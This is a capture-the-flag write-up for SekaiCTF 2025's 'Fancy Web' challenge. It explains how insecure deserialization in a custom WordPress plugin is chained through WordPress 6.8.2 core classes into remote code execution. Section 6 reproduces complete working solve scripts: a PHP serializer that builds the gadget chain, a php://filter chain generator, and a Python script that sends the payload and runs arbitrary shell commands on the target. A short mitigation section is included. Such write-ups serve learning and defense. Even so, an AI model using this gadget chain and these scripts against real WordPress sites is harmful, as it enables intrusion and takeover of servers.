---
ctf: SekaiCTF
title: Fancy Web
authors:
    - name: Dimas Maulana
      url: https://dimasc.tf/
description: The Ministry of Information and Communications Technology of Konoha has recently launched their new official website. While it appears to be a standard government portal showcasing public services and announcements, our intelligence sources have indicated that this WordPress-based website contains hidden information that could expose corruption and human rights violations. The website features a unique table processing system that displays various government data, but our analysts suspect that the developers have hidden sensitive information within the table structures themselves. The site's administrators are known for their sophisticated obfuscation techniques, making it difficult to distinguish between legitimate public data and concealed evidence. Your mission is to investigate this website and uncover the hidden information by looking beyond the surface-level content and examining how the tables are processed and displayed - the truth might be hidden, waiting for someone with the right skills to reveal it.
categories:
    - web
year: 2025
challengefiles: fancy-web
published: "2025-09-06"
hints:
    - Taking a closer look at `in_array` might offer some inspiration on where to look next.
    - The intended solution is to use `__toString` Gadget.
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** **Wordpress** website with custom plugin
    **- Key Discoveries:** custom table generation by making use of **PHP** `unserialize` and a bunch of tries to sanitize the user input
    **- Vulnerability:** insecure deserialization due to insufficient input validation and sanitization
    **- Exploitation:** triggering the **PHP** `unserialize` and exploiting a POP chain in the **Wordpress** core

# 1. Introduction<a id="introduction"></a>

Starting the web application, we are greeted by a simple page that allows us to input arbitrary base-64 strings of serialized data:

![landing-page](ctf/writeups/sekaictf/fancyweb/landing.png "landing-page")

Here, we already see what might be happening in the backend. If you already had something to do with **PHP** `unserialize` the `O:20:"SecureTableGenerator":...` prefix written on the web page might be very familiar. Scrolling further, we are being hinted that there are some security checks going on, and we got a test payload to play with:

![landing-page-2](ctf/writeups/sekaictf/fancyweb/landing_2.png "landing-page-2")

Inserting the test payload leads to the generation of our own table:

![landing-page-test-payload](ctf/writeups/sekaictf/fancyweb/landing_test_payload.png "landing-page-test-payload")

Also hinting the `__wakeup` method already secured the input strongly indicates that this is a **PHP** `unserialize` challenge.

# 2. Reconnaissance<a id="reconnaissance"></a>

Having a look into the challenge setup it becomes clear this is a **Wordpress** website running the latest version `6.8.2`. **Wordpress** is a very popular CMS (content management system) based on **PHP**, which allows you to build websites without requiring deeper knowledge in **PHP**. **Wordpress** comes by default with its core code and allows you to add several plugins and themes to improve the functionality and visuals of your website. The challenge has a plugin named `fancy`, which might be custom-written as its directory suggests. Having a look at the code of the `fancy.php` it seems like there is a lot going on with almost 800 lines of **PHP** code. Funny enough on top of the `SecureTableGenerator` class is a comment hinting that most of the code is written with AI models like **ChatGPT** or **ClaudeAI**:

```php
 /**
 * SecureTableGenerator - A serializable class for creating beautiful HTML tables
 * Features security measures to prevent common serialization attacks, made with vibe coding.
 */
class SecureTableGenerator
```

By searching for `unserialize(` in the code, we have 4 locations where this **PHP** functionality is used. The most interesting part seems to be like the location where `unserialize` is called with user **POST** input without previous sanitization and validation:

```php
$userBase64Data = trim($_POST['serialized_data']);
echo "<p><strong>Base64 Input Data:</strong> " . htmlspecialchars(substr($userBase64Data, 0, 100)) . "...</p>";

// Decode base64 first
$userSerializedData = base64_decode($userBase64Data, true);

if ($userSerializedData === false) {
    echo "<p style='color: red;'><strong>❌ Invalid base64 encoding</strong></p>";
    echo "<p>Please provide valid base64 encoded serialized data.</p>";
} else {
    echo "<p><strong>Decoded Serialized Data:</strong> " . htmlspecialchars(substr($userSerializedData, 0, 150)) . "...</p>";

    // Attempt to unserialize user input
    $userTable = @unserialize($userSerializedData);

    if ($userTable instanceof SecureTableGenerator) {
        echo "<p style='color: green;'><strong>✅ Successfully unserialized user data!</strong></p>";
        echo "<p><em>Note: __wakeup() method automatically secured the data</em></p>";
        echo $userTable->generateTable();
    } else {
        echo "<p style='color: red;'><strong>❌ Failed to unserialize data or invalid object type</strong></p>";
        echo "<p>Please provide valid SecureTableGenerator serialized data.</p>";
    }
```

# 3. Vulnerability Description<a id="vulnerability description"></a>

The website intends that users are only allowed to input serialized `SecureTableGenerator` objects. But the security validations to ensure this are very bad. As we already saw, the `unserialize` function is called on any user input without previous validations and sanitizations. Although just right after the `unserialize`, there is a check trying to make sure only `SecureTableGenerator` was deserialized. But at this point, any malicious `unserialize` payload was already executed, so there is no point in making these checks just afterwards. When `unserialize` is called, internally **PHP** will automatically call the `__wakeup` method of the dedicated object that is deserialized, if defined. Besides objects, it is also possible to deserialize a bunch of other stuff like arrays, strings, and integers. If you are interested in reading further information about **PHP** serialization I recommend reading [PHP serialization](https://www.phpinternalsbook.com/php5/classes_objects/serialization.html).

# 4. Exploitation<a id="exploitation"></a>

An attacker could now create a malicious payload with a serialized object. To achieve RCE we need a special sink that e.g. allows us to execute arbitrary **PHP** functions. To reach these sinks, we can start, for example, with the `__wakeup` method that is automatically called via `unserialize`. But not only is `__wakeup` automatically called, there are a lot of other methods like `__destruct` and  `__toString` that are called at a specific point and might be interesting as an entry point. To eventually reach our RCE sink, we have to create a chain of different objects with carefully set properties. This could influencing the control flow of, for example, the `__wakeup` method and all the called functionality by triggering only specific branches. This is called a POP chain (Property Oriented Programming). So to exploit the `unserialize` vulnerability we have to find such a POP chain either in the `fancy` plugin itself or in the **Wordpress** core.

# 4.1. The POP Entry<a id="the pop entry"></a>

Having a look at the plugin code itself, most of the functionality is about some weird **XSS** sanitizations which are not interesting at all to us. However an interesting sanitization is the removal of specific malicious **PHP** keywords like `eval`, `exec` and `system`. If we want to make use of `SecureTableGenerator` for our malicious payload, we need to be aware of this. During the competition, two hints were released as a lot of people got stuck:

```
Hint 1: Taking a closer look at "in_array" might offer some inspiration on where to look next.
Hint 2: The intended solution is to use "__toString" Gadget.
```

In the plugin code itself, we can find the following part, which matches the description of the hints perfectly:

```php
    private function resetSecurityProperties()
    {

        // Validate allowed tags
        $safeTags = ['b', 'i', 'strong', 'em', 'u', 'span', 'div', 'p'];
        $validatedTags = [];

        foreach ($this->allowedTags as $tag) {
            if (in_array($tag, $safeTags)) {
                $validatedTags[] = $tag;
            }
        }

        $this->allowedTags = $validatedTags ?: ['b', 'i', 'strong', 'em', 'u'];
    }
```

When `in_array` is being called, to check wether an array consisting of strings contains a specific string, **PHP** will internally call `__toString` if objects are used for the comparison. For our POP chain, we can make use of this as the `resetSecurityProperties` method is called via the `__wakeup` method of the `SecureTableGenerator` class. We fully control the `allowedTags` array property, so we can set an element as an object for which the `__toString` method will be called for the comparison. So the `SecureTableGenerator` might be our best entry for this POP chain, followed by a class that implements an exploitable `__toString` method.

# 4.2. The Source And The Sink<a id="the source and the sink"></a>

Now it becomes exponentially difficult to create the POP chain. There could be a lot of different ways to reach an RCE sink, and we have to figure this out. Fortunately there is already an interesting [article](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/) about finding POP chains in the **Wordpress** core which will also help us building up the POP chain. Reading through this article and searching in the source code of **Wordpress** we can find out that neither the source nor the sink is usable anymore. However, the middle part of the POP chain is still usable.

For the source, the article uses a class called [WP_Theme](https://github.com/WordPress/WordPress/blob/6.8.2/wp-includes/class-wp-theme.php#L550). This POP chain entry was fixed by **Wordpress** by implementing some checks in its `__wakeup` method. However there are still some interesting classes around in the **Wordpress** core one of them being [WP_HTML_Tag_Processor](https://github.com/WordPress/WordPress/blob/6.8.2/wp-includes/html-api/class-wp-html-tag-processor.php#L4125) implementing an interesting `__toString` method as we will see soon.

Also, the sink used in the article is not usable anymore, as for another class called [WP_Block_Type_Registry](https://github.com/WordPress/WordPress/blob/6.8.2/wp-includes/class-wp-block-type-registry.php#L171), which is used at the end of the POP chain, it now implements specific checks in its `__wakeup` method, preventing the exploitation of the POP chain. `WP_Block_Type_Registry` is used as it implements a `get_registered` method, which is needed for the POP chain. So either we use a different class implementing an interesting `call` method, which is always automatically called when a called method doesn't exist, or we find another class implementing an exploitable `get_registered` method. Luckily there is [WP_Block_Patterns_Registry](https://github.com/WordPress/WordPress/blob/6.8.2/wp-includes/class-wp-block-patterns-registry.php#L193) which implements a `get_registered` method, which eventually leads to an **PHP** `include` function call:

```php
if ( ! isset( $patterns[ $pattern_name ]['content'] ) && isset( $patterns[ $pattern_name ]['filePath'] ) ) {
    ob_start();
    include $patterns[ $pattern_name ]['filePath'];
    $patterns[ $pattern_name ]['content'] = ob_get_clean();
    unset( $patterns[ $pattern_name ]['filePath'] );
}
```

We have full control over the `$patterns` as we can set them ourselves as an attribute of the class in the serialized payload. If you didn't know yet if you got control over any **PHP** `include` or `require` as an attacker, you just got RCE. For exploitation, you can make use of [this public repository](https://github.com/synacktiv/php_filter_chain_generator/) which allows you to generate a ready-to-use payload. You can read for some further explanation [this article](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it). Basically it uses the `php://filter` stream wrapper to apply a chain of built-in stream filters, for example `convert.base64-encode` and `convert.iconv.*`, to transform the bytes returned by an included resource. After the filters run, the output begins with a valid `<?php` tag and the payload is executed — all without even uploading a file. By composing encoding and base64 encode/decode steps, the chains can craft or hide the exact byte sequence needed and thus helping evade naive input filters. So this is perfect to bypass the filtering in the `resetSecurityProperties` method of `SecureTableGenerator`.

So now that we have our source, `WP_HTML_Tag_Processor` with the `__toString` method, which we can trigger via the `SecureTableGenerator` due to the `in_array` operations, and our sink, `WP_Block_Patterns_Registry`, obtaining RCE due to the controlled **PHP** `include` call, we can now connect both ends to get a full POP chain.

# 4.3. Chain Assembly<a id="chain assembly"></a>

The [article](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/) describes an interesting technique to pivot from one class to another by leveraging classes that implement the `ArrayAccess` class. If a class implements it, it will behave similarly to a normal array but by implementing its own functionality, e.g., for index accesses. The [blog](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/) uses the `WP_Block_List` class, and this is the same we are also looking for. Starting with our source `WP_HTML_Tag_Processor` within the `__toString` method, we go over to the `get_updated_html` method, which will eventually call `class_name_updates_to_attributes_updates`. This method got an interesting case handling `$this->attributes` as an array, which is exactly what we are looking for:

```php
if ( false === $existing_class && isset( $this->attributes['class'] ) ) {
    $existing_class = substr(
        $this->html,
        $this->attributes['class']->value_starts_at,
        $this->attributes['class']->value_length
    );
}
```

So if we define `class` in this array and the array itself is an instance of `WP_Block_List`, the [offsetGet method](https://github.com/WordPress/WordPress/blob/6.8.2/wp-includes/class-wp-block-list.php#L92) will be called on that class and we pivot:

```php
public function offsetGet( $offset ) {
    $block = $this->blocks[ $offset ];

    if ( isset( $block ) && is_array( $block ) ) {
        $block = new WP_Block( $block, $this->available_context, $this->registry );
```

As we see in the source code of `WP_Block_List`, a `new WP_Block` is created. From here on we can just follow the [blog](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/) triggering the `__construct` method of `WP_Block`, which is always called by **PHP** when an instance is created.

```php
public function __construct( $block, $available_context = array(), $registry = null ) {
    $this->parsed_block = $block;
    $this->name         = $block['blockName'];

    if ( is_null( $registry ) ) {
        $registry = WP_Block_Type_Registry::get_instance();
    }

    $this->registry = $registry;

    $this->block_type = $registry->get_registered( $this->name );
```

Eventually, the `get_registered` method is called on the `$registry` attribute of the `WP_Block` instance. So, setting the `$registry` to an instance of `WP_Block_Patterns_Registry`, we will finally reach our sink with the `include` being called and achieve RCE.

# 5. Mitigation<a id="mitigation"></a>

Rule number one is always escape, validate, and sanitize any external input. The use of `unserialize` always comes with its risks, as presented with this challenge. Although the custom **Wordpress** plugin `fancy` doesn't have an exploitable POP chain itself, you should always be aware that the underlying code like the **Wordpress** core also might have some flaws. So don't use `unserialize` if not really necessary. If you really need to use `unserialize` make sure to only use it on very restricted input sources and use whitelists and other methods vor sanitization. Although the developers of the `fancy` plugin tried to implement simple whitelists, it has been done very poorly. As soon as the `unserialize` is called, it doesn't make any sense to do some kind of filtering afterwards, as the payload has already been executed.

# 6. Solve script<a id="solve script"></a>

As unfortunately, I wasn't able to solve the challenge in time during the competition (nor did anyone else), the following are the public solve scripts of the [author](https://github.com/dimasma0305) which can also be found among the other challenge files in [this repository](https://github.com/project-sekai-ctf/sekaictf-2025/tree/main/web/fancy-web/solution):

```php
<?php
/**
 *
WP_Block_Patterns_Registry->get_content (\wp-includes\class-wp-block-patterns-registry.php:178)
WP_Block_Patterns_Registry->get_registered (\wp-includes\class-wp-block-patterns-registry.php:199)
WP_Block->__construct (\wp-includes\class-wp-block.php:139)
WP_Block_List->offsetGet (\wp-includes\class-wp-block-list.php:96)
WP_HTML_Tag_Processor->class_name_updates_to_attributes_updates (\wp-includes\html-api\class-wp-html-tag-processor.php:2284)
WP_HTML_Tag_Processor->get_updated_html (\wp-includes\html-api\class-wp-html-tag-processor.php:4158)
WP_HTML_Tag_Processor->__toString (\wp-includes\html-api\class-wp-html-tag-processor.php:4126)
in_array (\wp-content\plugins\custom-footer\custom-footer.php:444)
SecureTableGenerator->resetSecurityProperties (\wp-content\plugins\custom-footer\custom-footer.php:444)
SecureTableGenerator->__wakeup (\wp-content\plugins\custom-footer\custom-footer.php:129)
unserialize (\wp-content\plugins\custom-footer\custom-footer.php:610)
index (\wp-content\plugins\custom-footer\custom-footer.php:610)
WP_Hook->apply_filters (\wp-includes\class-wp-hook.php:324)
WP_Hook->do_action (\wp-includes\class-wp-hook.php:348)
do_action (\wp-includes\plugin.php:517)
require_once (\wp-includes\template-loader.php:13)
require (\wp-blog-header.php:19)
{main} (\index.php:17)
 */
namespace {
    class WP_HTML_Tag_Processor {
        public $html;
        public $parsing_namespace = 'html';
        public $attributes = array();
        public $classname_updates = [1];
        public function __construct( $attributes ) {
            $this->attributes = $attributes;
            $this->html = "foobar";
        }
    }
    class WP_Block_List  {
        public $blocks = ['class' => ['blockName'=> 'test','a' =>'a']];
        public $registry;
        public function __construct(  $registry  ) {
            $this->registry          = $registry;
        }
    }
    final class WP_Block_Patterns_Registry {
        public $registered_patterns;
        public function __construct($payload) {
            $this->registered_patterns = ['test' => ['filePath' => $payload]];
        }
    }
    class WP_Query {
        public function __construct($compat_methods) {
            $this->compat_methods = $compat_methods;
        }
    }
    class WP_Theme {
        public function __construct($headers) {
        $this->headers = $headers;
        }
    }
     class SecureTableGenerator {
        private $data;
        private $headers;
        private $tableClass;
        private $allowedTags;

        public function __construct($allowedTags)
        {
            $this->allowedTags = $allowedTags;
        }
    }
    $payload = $argv[1];
    $WP_block_patterns_registry = new WP_Block_Patterns_Registry($payload);
    $WP_block_list = new WP_Block_List($WP_block_patterns_registry);
    $WP_HTML_tag_processor = new WP_HTML_Tag_Processor($WP_block_list);
    $SecureTableGenerator = new SecureTableGenerator([$WP_HTML_tag_processor]);

    echo base64_encode(serialize($SecureTableGenerator));
}
```

```python
#!/usr/bin/env python3
import argparse
import base64
import re

# - Useful infos -
# https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
# https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

# No need to guess a valid filename anymore
file_to_use = "php://temp"

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}

def generate_filter_chain(chain, debug_base64 = False):

    encoded_chain = chain
    # generate some garbage base64
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
    filters += "convert.iconv.UTF8.UTF7|"


    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        # don't add the decode while debugging chains
        filters += "convert.base64-decode"

    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    return final_payload

def main():

    # Parsing command line arguments
    parser = argparse.ArgumentParser(description="PHP filter chain generator.")

    parser.add_argument("--chain", help="Content you want to generate. (You will maybe need to pad with spaces for your payload to work)", required=False)
    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
    args = parser.parse_args()
    if args.chain is not None:
        chain = args.chain.encode('utf-8')
        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
        chain = generate_filter_chain(base64_value)
        print(chain)
    if args.rawbase64 is not None:
        rawbase64 = args.rawbase64.replace("=", "")
        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
        if (match):
            chain = generate_filter_chain(rawbase64, True)
            print(chain)
        else:
            print ("[-] Base64 string required.")
            exit(1)

if __name__ == "__main__":
    main()
```

```python
import argparse
import httpx
import asyncio
from subprocess import Popen, PIPE

URL = "http://localhost"
# URL = "http://18.140.17.89:9100"

def payload(payload):
    filter_chain = Popen(['python3', 'filter_chain.py', '--chain', payload], stdout=PIPE, stderr=PIPE)
    filter_chain = filter_chain.stdout.read().decode('utf-8').strip()
    return Popen(['php', 'solve.php', filter_chain], stdout=PIPE, stderr=PIPE).stdout.read().decode('utf-8')

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=10)

    def serialize(self, payload: str) -> None:
        # content = base64.b64encode(content.encode()).decode()
        return self.c.post("/", data={"serialized_data": payload, "generate": "Generate"})

class API(BaseAPI):
    ...

async def main(command):
    api = API()
    res = await api.serialize(payload(f"<?php system('{command} > /var/www/html/wp-content/uploads/this_is_secret_folder_dont_touch_it');?>"))
    # print(res.text)
    res = await api.c.get("/wp-content/uploads/this_is_secret_folder_dont_touch_it")
    print(res.text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("command", help="Der Befehl, der in das Payload eingefügt wird")
    args = parser.parse_args()

    asyncio.run(main(args.command))
```

# 7. Flag<a id="flag"></a>

SEKAI{wordpress_new_gadget}
